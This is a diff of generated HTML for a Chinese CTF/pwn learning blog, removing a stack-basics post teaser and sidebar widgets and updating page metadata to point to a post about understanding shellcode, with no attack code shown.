-可以将谢师傅的视频作为阅读本文的前提，接下来所出现的名词将不再作解释（19分51秒到35分32秒，以及56分31秒到1时4分为栈部分内容）
-[pwn入门]0基础学习程序与计算机-2_哔哩哔哩_bilibili
-无妨从栈在语文中的定义理解—&gt;存储货物或供旅客住宿的地方,可引申为仓库、中转站。
-在计算机系统中，栈则是一个具有以上属...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-09-13T20:20:05+08:00">2022-09-13</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/09/13/%E6%A0%88%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/categories/%E6%A0%88/">
-            <section class="post prev white-box shadow floatable blur" >
-              <i class="fa-solid fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          2 / 2
-        </p>
-        
-      </div>
-    
-  
+  </article>
 
 
-    
-  
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2671,177 +2639,42 @@ R...
     
     
       
-<section class="widget blogger desktop mobile pjax">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://s1.ax1x.com/2022/11/11/zCx4US.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Chen</h2>
-        
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fa-solid fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fa-solid fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fa-solid fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop pjax">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/Linux/" href="/categories/Linux/"
-            active-action="action-categoriesLinux"
-            ><div class='name'>Linux</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/reverse/" href="/categories/reverse/"
-            active-action="action-categoriesreverse"
-            ><div class='name'>reverse</div><div class='badge'>(3)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/web/" href="/categories/web/"
-            active-action="action-categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(6)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/wp/" href="/categories/wp/"
-            active-action="action-categorieswp"
-            ><div class='name'>wp</div><div class='badge'>(16)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%9F%BA%E7%A1%80/" href="/categories/%E5%9F%BA%E7%A1%80/"
-            active-action="action-categoriesE59FBAE7A180"
-            ><div class='name'>基础</div><div class='badge'>(7)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%A0%86/" href="/categories/%E5%A0%86/"
-            active-action="action-categoriesE5A086"
-            ><div class='name'>堆</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E5%AF%86%E7%A0%81/" href="/categories/%E5%AF%86%E7%A0%81/"
-            active-action="action-categoriesE5AF86E7A081"
-            ><div class='name'>密码</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%A0%88/" href="/categories/%E6%A0%88/"
-            active-action="action-categoriesE6A088"
-            ><div class='name'>栈</div><div class='badge'>(14)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/" href="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"
-            active-action="action-categoriesE8999AE68B9FE69CBA"
-            ><div class='name'>虚拟机</div><div class='badge'>(4)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget text desktop pjax">
-  
-  <header>
-    
-      <a target="_blank" rel="noopener" href='https://space.bilibili.com/185447556'><i class="fab fa-github fa-fw" aria-hidden="true"></i><span class='name'>b站账号</span></a>
-    
-  </header>
-
-
-  <div class='content'>
-    
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky pjax">
 
+  
+  
+
+
+  <div class="">
+    <!-- pjax占位 -->
+  </div>
+
+  
+
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
+
+  <div class="pjax">
+    <!-- pjax占位 -->
+  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2869,13 +2702,14 @@ R...
 </aside>
 
 
+
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3389,7 +3223,7 @@ R...
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/基础/","name":"基础"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/12/19/对于shellcode的一些理解/","name":"对于shellcode的一些理解"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"对于shellcode的一些理解","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/12/19/%E5%AF%B9%E4%BA%8Eshellcode%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/","wordCount":0,"datePublished":"2022-12-19T07:50:51.000Z","dateModified":"2022-12-22T12:03:42.276Z","articleSection":"基础","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
